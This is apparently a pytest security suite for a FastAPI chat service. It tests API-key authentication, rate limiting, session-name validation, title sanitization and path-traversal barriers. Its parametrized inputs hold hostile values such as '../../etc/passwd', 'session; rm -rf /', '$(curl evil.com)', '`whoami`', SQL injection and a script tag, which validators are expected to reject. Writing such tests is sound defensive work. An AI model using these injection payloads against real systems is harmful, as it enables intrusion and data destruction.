"""Security test suite.

Covers the protection mechanisms called out in issue #2629:
- Authentication bypass attempts
- Session name injection attempts
- API key validation
- Rate limiting behavior
- Input sanitization
"""

from __future__ import annotations

import json
from configparser import ConfigParser
from pathlib import Path
from unittest.mock import patch

import pytest
from fastapi.testclient import TestClient

import nyxgpt.app as app_module
from nyxgpt.app import app
from nyxgpt.chat import ChatResult
from nyxgpt.config import get_sessions_dir
from nyxgpt.rate_limiter import RateLimiter
from nyxgpt.sessions import (
    VALID_SESSION_NAME_PATTERN,
    list_sessions,
    meta_file_for,
    sanitize_title_for_filename,
    session_file_for,
    validate_session_name,
)

pytestmark = pytest.mark.unit


def _auth_enabled_cfg(
    api_key: str = "s3cr3t-key", header: str = "X-API-Key", enabled: bool = True
) -> ConfigParser:
    cfg = ConfigParser()
    cfg.add_section("auth")
    cfg.set("auth", "enabled", "true" if enabled else "false")
    cfg.set("auth", "api_key", api_key)
    cfg.set("auth", "header", header)
    return cfg


@pytest.fixture
def client() -> TestClient:
    return TestClient(app)


@pytest.fixture
def isolated_sessions_dir(tmp_path, monkeypatch):
    """Point the app's session storage at a throwaway tmp_path directory so
    endpoint-level tests never touch the real ~/.nyxGPT/sessions data."""
    cfg = ConfigParser()
    cfg.add_section("nyxgpt")
    cfg.set("nyxgpt", "sessions_dir", str(tmp_path))
    monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)
    return tmp_path


# ----------------------------
# Authentication bypass attempts
# ----------------------------


class TestAuthenticationBypass:
    def test_request_without_api_key_rejected(self, client, monkeypatch):
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/info")

        assert resp.status_code == 401
        assert resp.json()["error"]["code"] == "unauthorized"

    def test_request_with_wrong_api_key_rejected(self, client, monkeypatch):
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/info", headers={"X-API-Key": "wrong-key"})

        assert resp.status_code == 401

    def test_request_with_correct_api_key_allowed(self, client, monkeypatch):
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/info", headers={"X-API-Key": "s3cr3t-key"})

        assert resp.status_code != 401

    def test_health_endpoint_bypasses_auth(self, client, monkeypatch):
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/health")

        assert resp.status_code == 200

    def test_docs_endpoint_bypasses_auth(self, client, monkeypatch):
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/docs")

        assert resp.status_code == 200

    def test_openapi_endpoint_bypasses_auth(self, client, monkeypatch):
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/openapi.json")

        assert resp.status_code == 200

    def test_auth_disabled_allows_unauthenticated_access(self, client, monkeypatch):
        cfg = _auth_enabled_cfg(enabled=False)
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/info")

        assert resp.status_code != 401

    def test_empty_api_key_header_rejected(self, client, monkeypatch):
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/info", headers={"X-API-Key": ""})

        assert resp.status_code == 401

    def test_whitespace_padded_key_rejected(self, client, monkeypatch):
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/info", headers={"X-API-Key": " s3cr3t-key "})

        assert resp.status_code == 401

    def test_sql_injection_in_key_header_rejected(self, client, monkeypatch):
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/info", headers={"X-API-Key": "' OR '1'='1"})

        assert resp.status_code == 401

    def test_header_name_lookup_is_case_insensitive_per_http_spec(self, client, monkeypatch):
        """HTTP headers are case-insensitive; sending a differently-cased
        header name is not a bypass technique, it should still authenticate."""
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/info", headers={"x-api-key": "s3cr3t-key"})

        assert resp.status_code != 401

    def test_unprotected_prefix_not_affected_by_auth(self, client, monkeypatch):
        """Paths outside /api/v1 are intentionally not protected by this
        middleware; confirm that scoping still requires auth on real API
        paths regardless of trailing slash tricks."""
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/sessions")

        assert resp.status_code == 401


# ----------------------------
# Session name injection attempts
# ----------------------------


class TestSessionNameInjection:
    @pytest.mark.parametrize(
        "malicious_name",
        [
            "../etc/passwd",
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/passwd",
            "session/../../secrets",
            "session\x00.json",
            "<script>alert(1)</script>",
            "'; DROP TABLE sessions; --",
            "session; rm -rf /",
            "session name with spaces",
            "session\nname",
            "session\tname",
            "x" * 65,
            "",
            "   ",
            "session/with/slashes",
            "café",
            "😀session",
        ],
    )
    def test_rejects_malicious_session_names(self, malicious_name):
        with pytest.raises(ValueError):
            validate_session_name(malicious_name)

    @pytest.mark.parametrize(
        "valid_name",
        ["valid-session", "chat_2024", "ProjectX", "a", "x" * 64, "session-123_abc"],
    )
    def test_accepts_valid_session_names(self, valid_name):
        assert validate_session_name(valid_name) == valid_name

    def test_rejects_non_string_input(self):
        with pytest.raises(ValueError):
            validate_session_name(None)  # type: ignore[arg-type]

    def test_session_init_endpoint_rejects_path_traversal(self, client, isolated_sessions_dir):
        resp = client.post("/api/v1/sessions/init", json={"name": "../../../etc/passwd"})

        assert resp.status_code == 422

    def test_session_init_endpoint_rejects_null_byte(self, client, isolated_sessions_dir):
        resp = client.post("/api/v1/sessions/init", json={"name": "evil\x00name"})

        assert resp.status_code == 422

    def test_session_rename_endpoint_rejects_path_traversal_in_new_name(
        self, client, isolated_sessions_dir
    ):
        # Create a real session first so the rename target lookup succeeds.
        init_resp = client.post("/api/v1/sessions/init", json={"name": "rename-target"})
        assert init_resp.status_code == 200

        resp = client.post(
            "/api/v1/sessions/rename-target/rename",
            json={"new_name": "../../etc/passwd", "sync_filename": False},
        )

        assert resp.status_code == 400

        # No file should have escaped the sessions directory.
        escaped = isolated_sessions_dir.parent / "etc" / "passwd.json"
        assert not escaped.exists()

    def test_session_file_for_never_escapes_sessions_dir(self, tmp_path):
        from nyxgpt.sessions import session_file_for

        sf = session_file_for("valid-name", tmp_path)
        assert sf.parent == tmp_path

        with pytest.raises(ValueError):
            session_file_for("../escape", tmp_path)


# ----------------------------
# API key validation
# ----------------------------


class TestApiKeyValidation:
    def test_uses_constant_time_comparison(self, client, monkeypatch):
        """Verify secrets.compare_digest (constant-time) is used for the key
        check rather than a plain == comparison, which prevents timing
        attacks that could leak the key byte-by-byte."""
        cfg = _auth_enabled_cfg()
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        calls: list[tuple[str, str]] = []
        original = app_module.secrets.compare_digest

        def spy(a: str, b: str) -> bool:
            calls.append((a, b))
            return original(a, b)

        monkeypatch.setattr(app_module.secrets, "compare_digest", spy)

        client.get("/api/v1/info", headers={"X-API-Key": "s3cr3t-key"})

        assert calls, "expected secrets.compare_digest to be used for API key checks"

    def test_configured_empty_api_key_always_rejects(self, client, monkeypatch):
        """If auth is enabled but no key is configured, every request should
        be rejected -- an empty configured key must never act as a wildcard."""
        cfg = _auth_enabled_cfg(api_key="")
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/info", headers={"X-API-Key": ""})
        assert resp.status_code == 401

        resp = client.get("/api/v1/info", headers={"X-API-Key": "anything"})
        assert resp.status_code == 401

    def test_disabled_auth_never_resolves_api_key(self, client, monkeypatch):
        """When auth is disabled, the middleware must not resolve the API
        key at all (it's a plain `enabled` config read and an early
        return) -- this is what keeps a cloud-secrets provider from being
        hit on every request when auth isn't even in use. See #3507."""
        cfg = _auth_enabled_cfg(enabled=False)
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        def _boom(*_a, **_k):
            raise AssertionError("get_auth_api_key should not be called when auth is disabled")

        monkeypatch.setattr(app_module, "get_auth_api_key", _boom)

        resp = client.get("/api/v1/info")

        assert resp.status_code != 401

    def test_enabled_auth_resolves_via_threadpool(self, client, monkeypatch):
        """The api key resolution (which may hit AWS for a cloud secrets
        provider) is run in a thread pool rather than directly on the
        event loop -- verify the middleware still enforces auth correctly
        end-to-end through that path. See #3507."""
        cfg = _auth_enabled_cfg(api_key="cloud-resolved-key")
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        calls: list[str] = []
        original_run_in_threadpool = app_module.run_in_threadpool

        async def _spy(func, *args, **kwargs):
            calls.append(getattr(func, "__name__", str(func)))
            return await original_run_in_threadpool(func, *args, **kwargs)

        monkeypatch.setattr(app_module, "run_in_threadpool", _spy)

        resp = client.get("/api/v1/info", headers={"X-API-Key": "cloud-resolved-key"})

        assert resp.status_code != 401
        assert calls == ["_auth_cfg"]

    def test_custom_header_name_is_respected(self, client, monkeypatch):
        cfg = _auth_enabled_cfg(header="X-Custom-Auth")
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        # Default header name should no longer work.
        resp = client.get("/api/v1/info", headers={"X-API-Key": "s3cr3t-key"})
        assert resp.status_code == 401

        # Configured custom header should work.
        resp = client.get("/api/v1/info", headers={"X-Custom-Auth": "s3cr3t-key"})
        assert resp.status_code != 401

    def test_key_prefix_is_not_accepted(self, client, monkeypatch):
        cfg = _auth_enabled_cfg(api_key="s3cr3t-key")
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/info", headers={"X-API-Key": "s3cr3t"})
        assert resp.status_code == 401

    def test_key_comparison_is_case_sensitive(self, client, monkeypatch):
        cfg = _auth_enabled_cfg(api_key="s3cr3t-key")
        monkeypatch.setattr(app_module, "load_config", lambda *_a, **_k: cfg)

        resp = client.get("/api/v1/info", headers={"X-API-Key": "S3CR3T-KEY"})
        assert resp.status_code == 401


# ----------------------------
# Rate limiting behavior
# ----------------------------


class TestRateLimiting:
    @pytest.fixture(autouse=True)
    def _reset_rate_limiter(self):
        original = app_module._rate_limiter
        yield
        app_module._rate_limiter = original

    def test_requests_within_burst_allowed(self, client, monkeypatch):
        app_module._rate_limiter = RateLimiter(requests_per_second=1, burst_size=2)

        r1 = client.get("/health", headers={"X-Forwarded-For": "10.0.0.1"})
        r2 = client.get("/health", headers={"X-Forwarded-For": "10.0.0.1"})

        assert r1.status_code == 200
        assert r2.status_code == 200

    def test_requests_over_burst_rejected(self, client):
        app_module._rate_limiter = RateLimiter(requests_per_second=1, burst_size=2)

        client.get("/health", headers={"X-Forwarded-For": "10.0.0.2"})
        client.get("/health", headers={"X-Forwarded-For": "10.0.0.2"})
        resp = client.get("/health", headers={"X-Forwarded-For": "10.0.0.2"})

        assert resp.status_code == 429
        assert resp.json()["error"]["code"] == "rate_limit_exceeded"

    def test_rejected_request_increments_rate_limit_metric(self, client):
        from prometheus_client.parser import text_string_to_metric_families

        from nyxgpt import metrics as prom_metrics

        app_module._rate_limiter = RateLimiter(requests_per_second=1, burst_size=2)

        client.get("/health", headers={"X-Forwarded-For": "10.0.0.3"})
        client.get("/health", headers={"X-Forwarded-For": "10.0.0.3"})
        resp = client.get("/health", headers={"X-Forwarded-For": "10.0.0.3"})
        assert resp.status_code == 429

        body, _ = prom_metrics.render_metrics()
        samples = [
            sample
            for family in text_string_to_metric_families(body.decode("utf-8"))
            for sample in family.samples
            if sample.name == "nyxgpt_rate_limit_rejections_total"
            and sample.labels.get("path") == "/health"
        ]
        assert samples and samples[0].value >= 1

    def test_rate_limit_headers_present_on_success(self, client):
        app_module._rate_limiter = RateLimiter(requests_per_second=1, burst_size=5)

        resp = client.get("/health", headers={"X-Forwarded-For": "10.0.0.3"})

        assert "X-RateLimit-Limit" in resp.headers
        assert "X-RateLimit-Remaining" in resp.headers
        assert "X-RateLimit-Reset" in resp.headers

    def test_rate_limit_headers_present_on_429(self, client):
        app_module._rate_limiter = RateLimiter(requests_per_second=1, burst_size=1)

        client.get("/health", headers={"X-Forwarded-For": "10.0.0.4"})
        resp = client.get("/health", headers={"X-Forwarded-For": "10.0.0.4"})

        assert resp.status_code == 429
        assert resp.headers["X-RateLimit-Remaining"] == "0"

    def test_different_clients_have_independent_limits(self, client):
        app_module._rate_limiter = RateLimiter(requests_per_second=1, burst_size=1)

        client.get("/health", headers={"X-Forwarded-For": "10.0.0.5"})
        resp_same_client = client.get("/health", headers={"X-Forwarded-For": "10.0.0.5"})
        resp_other_client = client.get("/health", headers={"X-Forwarded-For": "10.0.0.6"})

        assert resp_same_client.status_code == 429
        assert resp_other_client.status_code == 200

    def test_rate_limiting_disabled_by_default(self, client):
        app_module._rate_limiter = None

        for _ in range(10):
            resp = client.get("/health")
            assert resp.status_code == 200


# ----------------------------
# Input sanitization
# ----------------------------


class TestInputSanitization:
    @pytest.mark.parametrize(
        "raw_title",
        [
            "<script>alert(1)</script>",
            "../../etc/passwd",
            "'; DROP TABLE sessions; --",
            "session; rm -rf /",
            "$(curl evil.com)",
            "`whoami`",
            "session\x00name",
            "a" * 500,
        ],
    )
    def test_sanitize_title_always_produces_valid_session_name(self, raw_title):
        sanitized = sanitize_title_for_filename(raw_title)

        assert VALID_SESSION_NAME_PATTERN.match(
            sanitized
        ), f"sanitized title {sanitized!r} does not satisfy the session name pattern"
        # Must also be independently accepted by the validator used at write time.
        assert validate_session_name(sanitized) == sanitized

    def test_sanitize_title_empty_after_stripping_falls_back(self):
        assert sanitize_title_for_filename("!!!///???") != ""

    def test_oversized_title_request_rejected(self, client, isolated_sessions_dir):
        resp = client.post("/api/v1/sessions/init", json={"name": "sanitize-target"})
        assert resp.status_code == 200

        resp = client.post("/api/v1/sessions/sanitize-target/title", json={"title": "x" * 201})
        assert resp.status_code == 422

    def test_empty_title_request_rejected(self, client, isolated_sessions_dir):
        resp = client.post("/api/v1/sessions/init", json={"name": "sanitize-target-2"})
        assert resp.status_code == 200

        resp = client.post("/api/v1/sessions/sanitize-target-2/title", json={"title": ""})
        assert resp.status_code == 422

    def test_oversized_request_body_rejected(self, client, isolated_sessions_dir):
        big_body = json.dumps({"name": "x" * 2_000_000})

        resp = client.post(
            "/api/v1/sessions/init",
            content=big_body,
            headers={"Content-Type": "application/json"},
        )

        assert resp.status_code == 413

    def test_malformed_json_returns_client_error_not_server_error(
        self, client, isolated_sessions_dir
    ):
        resp = client.post(
            "/api/v1/sessions/init",
            content="{not valid json",
            headers={"Content-Type": "application/json"},
        )

        assert resp.status_code < 500

    def test_non_string_session_name_type_rejected(self, client, isolated_sessions_dir):
        resp = client.post("/api/v1/sessions/init", json={"name": 12345})

        assert resp.status_code == 400


# ----------------------------
# Sink-side path validation chokepoint (issue #3639)
# ----------------------------


class TestSinkSidePathValidationChokepoint:
    """`session_file_for()`/`meta_file_for()` in sessions.py and
    `get_sessions_dir()`/`_expand_path()` in config.py are the sink-side
    barriers that close the CodeQL py/path-injection alerts. These tests
    exercise the barriers directly rather than through validate_session_name,
    since a delegated call is not what CodeQL recognises as the sanitizer."""

    @pytest.mark.parametrize(
        "malicious_name",
        [
            "../escape",
            "../../etc/passwd",
            "/etc/passwd",
            "session/../../secrets",
            "session\x00.json",
            "session; rm -rf /",
            "x" * 65,
            "",
        ],
    )
    def test_session_file_for_rejects_malicious_names(self, tmp_path, malicious_name):
        with pytest.raises(ValueError):
            session_file_for(malicious_name, tmp_path)

    def test_session_file_for_accepts_valid_name(self, tmp_path):
        sf = session_file_for("valid-name", tmp_path)
        assert sf == tmp_path / "valid-name.json"

    @pytest.mark.parametrize(
        # `Path.stem` only ever yields the final path component (a leading
        # "../" can't survive into it), so these cover the metacharacter/
        # empty/oversized cases meta_file_for's own barrier must catch.
        "malicious_stem",
        ["session\x00", "session; rm -rf /", "", "x" * 65],
    )
    def test_meta_file_for_rejects_malicious_session_file(self, tmp_path, malicious_stem):
        with pytest.raises(ValueError):
            meta_file_for(tmp_path / f"{malicious_stem}.json")

    def test_meta_file_for_accepts_valid_session_file(self, tmp_path):
        sf = tmp_path / "valid-name.json"
        assert meta_file_for(sf) == tmp_path / "valid-name.meta.json"

    def test_session_file_for_rejects_sessions_dir_outside_allowed_roots(self):
        with pytest.raises(ValueError):
            session_file_for("valid-name", Path("/etc"))

    def test_list_sessions_rejects_sessions_dir_outside_allowed_roots(self):
        with pytest.raises(ValueError):
            list_sessions(Path("/etc"))

    def test_list_sessions_skips_non_conforming_legacy_filenames(self, tmp_path):
        """A single legacy/hand-copied session file whose name doesn't match
        the chokepoint's allowlist (e.g. a dot or space in the name) must be
        skipped, not take down the whole listing with an unhandled
        ValueError."""
        (tmp_path / "valid-name.json").write_text(json.dumps([]), encoding="utf-8")
        (tmp_path / "legacy.backup file.json").write_text(json.dumps([]), encoding="utf-8")
        (tmp_path / ".hidden.json").write_text(json.dumps([]), encoding="utf-8")

        rows = list_sessions(tmp_path)

        assert [r["name"] for r in rows] == ["valid-name"]

    def test_config_get_sessions_dir_rejects_path_outside_allowed_roots(self):
        cfg = ConfigParser()
        cfg.add_section("nyxgpt")
        cfg.set("nyxgpt", "sessions_dir", "/etc/nyxgpt-sessions")

        with pytest.raises(ValueError):
            get_sessions_dir(cfg)

    def test_config_get_sessions_dir_accepts_home_relative_path(self):
        cfg = ConfigParser()
        cfg.add_section("nyxgpt")
        cfg.set("nyxgpt", "sessions_dir", "~/.nyxGPT/sessions")

        resolved = get_sessions_dir(cfg)
        assert resolved == Path.home() / ".nyxGPT" / "sessions"

    def test_chat_endpoint_sanitizes_malicious_sessions_dir_override(self, client):
        """A malicious `sessions_dir` in the chat request body must never
        reach run_chat() raw -- it must be routed through
        `_sessions_dir_from_str` first (defense-in-depth at the boundary,
        app.py:2990/3054/3267)."""
        captured_kwargs: dict = {}

        def fake_run_chat(prompt, **kwargs):
            captured_kwargs.update(kwargs)
            return ChatResult(
                session=kwargs.get("session", "default"),
                model=kwargs.get("model") or "m",
                reply="ok",
                rag_used=False,
                rag_chunks=0,
                rag_context=None,
            )

        with patch("nyxgpt.app.run_chat", autospec=True, side_effect=fake_run_chat):
            response = client.post(
                "/api/v1/chat",
                json={"prompt": "hi", "session": "sanitize-dir-test", "sessions_dir": "/etc"},
            )

        assert response.status_code == 200
        # "/etc" is outside the allowed roots, so the override must be refused
        # and fall back to None (not passed through raw, and not stringified
        # to the literal "None").
        assert captured_kwargs.get("sessions_dir") is None

    def test_chat_endpoint_passes_through_valid_sessions_dir_override(self, client, tmp_path):
        """A `sessions_dir` override that resolves inside an allowed root
        (e.g. the system temp dir) must still reach run_chat() as the
        resolved path string, not be swallowed by the None-fallback fix."""
        captured_kwargs: dict = {}

        def fake_run_chat(prompt, **kwargs):
            captured_kwargs.update(kwargs)
            return ChatResult(
                session=kwargs.get("session", "default"),
                model=kwargs.get("model") or "m",
                reply="ok",
                rag_used=False,
                rag_chunks=0,
                rag_context=None,
            )

        with patch("nyxgpt.app.run_chat", autospec=True, side_effect=fake_run_chat):
            response = client.post(
                "/api/v1/chat",
                json={
                    "prompt": "hi",
                    "session": "valid-dir-test",
                    "sessions_dir": str(tmp_path),
                },
            )

        assert response.status_code == 200
        assert captured_kwargs.get("sessions_dir") == str(tmp_path)
